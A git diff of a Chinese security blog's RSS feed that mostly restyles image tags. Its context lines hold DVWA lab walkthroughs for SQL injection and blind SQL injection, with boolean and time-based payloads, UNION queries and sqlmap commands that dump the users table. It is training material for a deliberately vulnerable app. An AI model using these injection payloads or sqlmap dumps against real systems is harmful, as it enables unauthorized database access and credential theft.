@@ -20,7 +20,16 @@
       <pubDate>Mon, 23 Sep 2024 12:22:12 +0000</pubDate>
       <guid>https://yuexuan521.github.io/zh/post/dvwa%E9%9D%B6%E5%9C%BA/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-dvwa%E9%80%9A%E5%85%B3%E6%8C%87%E5%8D%97-dvwa-sql-injection-blind-sql%E7%9B%B2%E6%B3%A8/</guid>
       <description>&lt;h2 id=&#34;dvwasqlinjection-blind&#34;&gt;DVWASQLInjection (Blind)&lt;/h2&gt;
-&lt;p&gt;&lt;img alt=&#34;在这里插入图片描述&#34; loading=&#34;lazy&#34; src=&#34;https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424583.jpeg&#34;&gt;&lt;/p&gt;
+&lt;p&gt;
+&lt;div class=&#34;post-img-view&#34;&gt;
+    &lt;a data-fancybox=&#34;gallery&#34; href=&#34;https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424583.jpeg&#34;&gt;
+        &lt;img src=&#34;https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424583.jpeg&#34; 
+             alt=&#34;在这里插入图片描述&#34; 
+              
+             loading=&#34;lazy&#34;
+        /&gt;
+    &lt;/a&gt;
+&lt;/div&gt;&lt;/p&gt;
 &lt;hr&gt;
 &lt;p&gt;参考文献&lt;/p&gt;
 &lt;ul&gt;
@@ -177,7 +186,16 @@
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;网页不会直接返回数据，而是返回特定信息。比如输入1，页面返回“User ID exists in the database.”，查询内容没有回显。&lt;/p&gt;</description>
       <content:encoded><![CDATA[<h2 id="dvwasqlinjection-blind">DVWASQLInjection (Blind)</h2>
-<p><img alt="在这里插入图片描述" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424583.jpeg"></p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424583.jpeg">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424583.jpeg" 
+             alt="在这里插入图片描述" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <hr>
 <p>参考文献</p>
 <ul>
@@ -333,7 +351,16 @@
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>网页不会直接返回数据，而是返回特定信息。比如输入1，页面返回“User ID exists in the database.”，查询内容没有回显。</p>
-<p><img alt="image-20240508105954105" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424584.png"></p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424584.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424584.png" 
+             alt="image-20240508105954105" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <h3 id="布尔盲注">布尔盲注</h3>
 <blockquote>
 <p><strong>布尔盲注</strong> ：通过构造SQL查询使结果影响网页响应（如页面内容变化），从而通过真/假判断逐位推测数据库信息。</p>
@@ -348,7 +375,16 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39; and 1=1#
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img alt="image-20240508110618261" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424585.png"></p>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424585.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424585.png" 
+             alt="image-20240508110618261" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <p>注入以下语句，根据回显信息查询失败。由此，判断此为字符型注入，并且需要单引号闭合。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -358,7 +394,16 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39; and 1=2#
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img alt="image-20240508111005482" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424586.png"></p>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424586.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424586.png" 
+             alt="image-20240508111005482" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <p>2、获取版本号</p>
 <p>首先探测版本号的长度，使用substr函数提取返回的版本号字符串，用length函数获得版本号字符串的长度，判断与猜测长度&quot;1&quot;是否相等。返回查询不存在，说明版本号字符串长度不为猜测长度&quot;1&quot;。</p>
 <div class="highlight"><div class="chroma">
@@ -377,7 +422,16 @@
 </span></span><span class="line"><span class="cl">// substr( string, start, length) 函数用于截取字符串 string，start 为起始位置，length 为长度。
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img alt="image-20240508111726299" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424587.png"></p>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424587.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424587.png" 
+             alt="image-20240508111726299" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <p>迭代查询语句，最后在猜测长度&quot;6&quot;返回查询存在，说明版本号字符串长度为6</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -387,7 +441,16 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39; and length(substr((select version()),1)) = 6 #
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img alt="image-20240508112420486" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424588.png"></p>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424588.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424588.png" 
+             alt="image-20240508112420486" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <p>接下来获取版本号字符串的内容，MySql的版本号由三个数字部分和可选的后缀组成，用点(“.”)分隔各个部分，形如 <code>5.7.23</code> 。猜测第一个数字为’5’，注入以下语句，返回查询结果存在，说明第一个字符为’5’。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -397,7 +460,16 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39; and substr((select version()),1,1) = &#39;5&#39;#
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img alt="image-20240508170141095" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424589.png"></p>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424589.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424589.png" 
+             alt="image-20240508170141095" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <p>通过采用穷举的方法，逐步尝试输入0 ~ 9的数字以及&quot;.&ldquo;符号，来进行SQL盲注攻击。在这一过程中，每一次注入测试都是为了识别能够成功执行的SQL查询部分。最终，将得到的字符片段拼接起来，确定了MySQL数据库的版本号为“5.7.26”。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -431,7 +503,16 @@
 </span></span><span class="line"><span class="cl">// SLEEP()函数是一个用于控制程序流程的函数，它能够让当前的SQL语句执行暂停一定的时间后再继续。
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img alt="image-20240508174027495" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424590.png"></p>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424590.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424590.png" 
+             alt="image-20240508174027495" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <p>注入以下语句，服务器响应时间达到3秒，说明sleep()函数执行，判断注入类型为字符型盲注。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -441,7 +522,16 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39; and sleep(3) #
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img alt="image-20240508173801671" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424592.png"></p>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424592.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424592.png" 
+             alt="image-20240508173801671" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <p>2、获取版本号</p>
 <p>注入以下语句，猜测版本号字符串的长度为1，服务器响应很快，说明sleep()函数没有执行。</p>
 <div class="highlight"><div class="chroma">
@@ -463,7 +553,16 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39; and if(length(substr((select version()), 1)) = 6, sleep(3), 1)#
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img alt="image-20240509091945541" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424593.png"></p>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424593.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424593.png" 
+             alt="image-20240509091945541" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <p>接下来获取版本号字符串的内容，MySql 的版本号由三个数字部分和可选的后缀组成，用点(“.”)分隔各个部分，形如 <code>5.7.23</code> 。猜测第一个数字为’5’，注入以下语句，服务器响应时间大于三秒，说明第一个字符为’5’。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -501,7 +600,16 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlmap -u &#34;http://dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&#34; --cookie &#34;PHPSESSID=psuncupdhgq2rj4lkp7jp1s1h3; security=low&#34; --batch --dbs
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img alt="image-20240509092715089" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424594.png"></p>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424594.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424594.png" 
+             alt="image-20240509092715089" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <p>得到数据库名后，选择dvwa数据库，爆破dvwa数据库下的表名。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -511,7 +619,16 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlmap -u &#34;http://dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&#34; --cookie &#34;PHPSESSID=psuncupdhgq2rj4lkp7jp1s1h3; security=low&#34; --batch -D dvwa --tables
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img alt="image-20240509093153249" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424595.png"></p>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424595.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424595.png" 
+             alt="image-20240509093153249" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <p>选择users数据表，查看users数据表有哪些字段</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -521,7 +638,16 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlmap -u &#34;http://dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&#34; --cookie &#34;PHPSESSID=psuncupdhgq2rj4lkp7jp1s1h3; security=low&#34; --batch -D dvwa -T users --columns
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img alt="image-20240509093314608" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424596.png"></p>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424596.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424596.png" 
+             alt="image-20240509093314608" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <p>选择users数据表下的user、password字段</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -531,7 +657,16 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlmap -u &#34;http://dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&#34; --cookie &#34;PHPSESSID=psuncupdhgq2rj4lkp7jp1s1h3; security=low&#34; --batch -D dvwa -T users -C user,password --dump
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img alt="image-20240509093507168" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424597.png"></p>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424597.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424597.png" 
+             alt="image-20240509093507168" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <h2 id="medium">Medium</h2>
 <p>0、分析网页源代码</p>
 <div class="highlight"><div class="chroma">
@@ -597,8 +732,26 @@
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>将DVWA Security调整到Medium级别，发现原本提交数据的文本框变成了下拉列表，需要使用Burp Suite抓包修改提交数据。同时，源代码中使用mysqli_real_escape_string()函数防范SQL注入，mysqli_real_escape_string()函数会转义字符串中的特殊字符，如 \x00、\n、\r、\、&rsquo;、&rdquo; 和 \x1a。</p>
-<p><img alt="image-20240509094258008" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424598.png"></p>
-<p><img alt="image-20240509094324275" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424599.png"></p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424598.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424598.png" 
+             alt="image-20240509094258008" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424599.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424599.png" 
+             alt="image-20240509094324275" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <p>虽然单引号在Medium级别中被转义，但我们可以使用ASCII码值来代替原来单引号括起来的字符。ascii() 函数可以将字符转换成 ASCII码值，然后我们同样把版本号的各个字符提取出来，然后和 0 ~ 9 和 “.” 11 个字符的 ASCII码值作比较。例如注入如下内容，可以测试出版本号第一个字符为 “5”。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -608,7 +761,16 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1 and ascii(substr((select version()), 1, 1)) = 53#
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img alt="image-20240509101517241" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424600.png"></p>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424600.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424600.png" 
+             alt="image-20240509101517241" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -648,7 +810,16 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1 and if(ascii(substr((select version()), 1, 1)) = 53, sleep(3), 1)#
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img alt="image-20240509102055721" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424601.png"></p>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424601.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424601.png" 
+             alt="image-20240509102055721" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <p><strong>布尔盲注代码</strong></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -817,7 +988,16 @@
 </span></span><span class="line"><span class="cl">sqlmap -r &#34;C:\1.txt&#34; --second-url &#34;http://dvwa/vulnerabilities/sqli_blind/&#34; --batch
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img alt="image-20240509175037711" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424602.png"></p>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424602.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424602.png" 
+             alt="image-20240509175037711" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <p>盲注有点慢，反而对猜测的过程有更直观的认识了。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -827,7 +1007,16 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlmap -r &#34;C:\Users\yuexuan\Desktop\1.txt&#34; --second-url &#34;http://dvwa/vulnerabilities/sqli_blind/&#34; --batch --dbs
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img alt="image-20240509175153935" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424603.png"></p>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424603.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424603.png" 
+             alt="image-20240509175153935" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -836,7 +1025,16 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlmap -r &#34;C:\Users\yuexuan\Desktop\1.txt&#34; --second-url &#34;http://dvwa/vulnerabilities/sqli_blind/&#34; --batch -D dvwa --tables
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img alt="image-20240509175349013" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424604.png"></p>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424604.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424604.png" 
+             alt="image-20240509175349013" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -845,7 +1043,16 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlmap -r &#34;C:\Users\yuexuan\Desktop\1.txt&#34; --second-url &#34;http://dvwa/vulnerabilities/sqli_blind/&#34; --batch -D dvwa -T users --columns
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img alt="image-20240509175850523" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424605.png"></p>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424605.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424605.png" 
+             alt="image-20240509175850523" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -939,7 +1146,16 @@
       <pubDate>Fri, 20 Sep 2024 12:25:03 +0000</pubDate>
       <guid>https://yuexuan521.github.io/zh/post/dvwa%E9%9D%B6%E5%9C%BA/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-dvwa%E9%80%9A%E5%85%B3%E6%8C%87%E5%8D%97-sql-injectionsql%E6%B3%A8%E5%85%A5/</guid>
       <description>&lt;h2 id=&#34;dvwasqlinjection&#34;&gt;DVWASQLInjection&lt;/h2&gt;
-&lt;p&gt;&lt;img alt=&#34;在这里插入图片描述&#34; loading=&#34;lazy&#34; src=&#34;https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735688.jpeg&#34;&gt;&lt;/p&gt;
+&lt;p&gt;
+&lt;div class=&#34;post-img-view&#34;&gt;
+    &lt;a data-fancybox=&#34;gallery&#34; href=&#34;https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735688.jpeg&#34;&gt;
+        &lt;img src=&#34;https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735688.jpeg&#34; 
+             alt=&#34;在这里插入图片描述&#34; 
+              
+             loading=&#34;lazy&#34;
+        /&gt;
+    &lt;/a&gt;
+&lt;/div&gt;&lt;/p&gt;
 &lt;hr&gt;
 &lt;p&gt;参考文献&lt;/p&gt;
 &lt;ul&gt;
@@ -950,7 +1166,16 @@
 &lt;p&gt;&lt;strong&gt;SQL注入漏洞基本原理&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;Web应用程序对用户输入的数据校验处理不严或者根本没有校验，致使用户可以拼接执行SQL命令。&lt;/p&gt;</description>
       <content:encoded><![CDATA[<h2 id="dvwasqlinjection">DVWASQLInjection</h2>
-<p><img alt="在这里插入图片描述" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735688.jpeg"></p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735688.jpeg">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735688.jpeg" 
+             alt="在这里插入图片描述" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <hr>
 <p>参考文献</p>
 <ul>
@@ -979,10 +1204,28 @@
 <p><strong>一、判断提交方式</strong></p>
 <p>在User ID中输入数字1，提交后发现，在URL地址栏出现了提交的参数，由此可以判断提交方式为get方式。</p>
 <p>提问：get和post提交方式对SQL注入的实施有什么影响？</p>
-<p><img alt="image-20240408153605723" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735689.png"></p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735689.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735689.png" 
+             alt="image-20240408153605723" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <p><strong>二、判断服务器处理类型（数字型或字符型）</strong></p>
 <p>加单引号，提交 <code>1'</code> ，出现报错信息，显示多出一个单引号，可以确定为字符型注入</p>
-<p><img alt="image-20240411212414415" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735690.png"></p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735690.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735690.png" 
+             alt="image-20240411212414415" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <p><strong>三、判断注入点</strong></p>
 <p>提交 <code>1' or 1=1#</code> 语句，结果返回了全部的内容，可以判断存在注入点</p>
 <div class="highlight"><div class="chroma">
@@ -993,7 +1236,16 @@
 <pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39; or 1=1#
 </span></span></span></code></pre></td></tr></table>
 </div>
-</div><p><img alt="image-20240411213036653" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735691.png"></p>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735691.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735691.png" 
+             alt="image-20240411213036653" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <p><strong>四、判断列数</strong></p>
 <p>使用 <code>order by</code> 语句判断目标数据库表中的列数，依次提交 <code>1' order by 1#</code> 语句，数字从大到小，当出现报错信息后确定列数。</p>
 <div class="highlight"><div class="chroma">
@@ -1008,9 +1260,36 @@
 </span></span></span><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39; order by 3# 
 </span></span></span></code></pre></td></tr></table>
 </div>
-</div><p><img alt="image-20240411214439810" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735692.png"></p>
-<p><img alt="image-20240411214409610" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735693.png"></p>
-<p><img alt="image-20240411214320827" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735694.png"></p>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735692.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735692.png" 
+             alt="image-20240411214439810" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735693.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735693.png" 
+             alt="image-20240411214409610" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735694.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735694.png" 
+             alt="image-20240411214320827" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <p>当提交 <code>1' order by 3#</code> 时出现报错信息，说明目标数据库表中的列数为2</p>
 <p><strong>五、提取库名、表名、字段名、值</strong></p>
 <p>1、提取库名</p>
@@ -1023,7 +1302,16 @@
 <pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39; union select 1,database()#
 </span></span></span></code></pre></td></tr></table>
 </div>
-</div><p><img alt="image-20240411214816515" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735695.png"></p>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735695.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735695.png" 
+             alt="image-20240411214816515" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <p>2、提取表名</p>
 <p>通过注入攻击来获取名为’dvwa’的数据库中的所有表名</p>
 <div class="highlight"><div class="chroma">
@@ -1049,7 +1337,16 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Illegal mix of collations for operation &#39;UNION&#39;
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img alt="image-20240411220050884" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735696.png"></p>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735696.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735696.png" 
+             alt="image-20240411220050884" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
 <p>这是由于MySQL在执行 <code>UNION</code> 操作时遇到的不同字符集之间的冲突报错。</p>
 <p>解决方法：打开CMD，登录MySQL的dvwa数据库，修改first_name和last_name字段的字符集</p>
 <div class="highlight"><div class="chroma">
@@ -1065,7 +1362,16 @@
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>修改完毕后，命令执行成功</p>
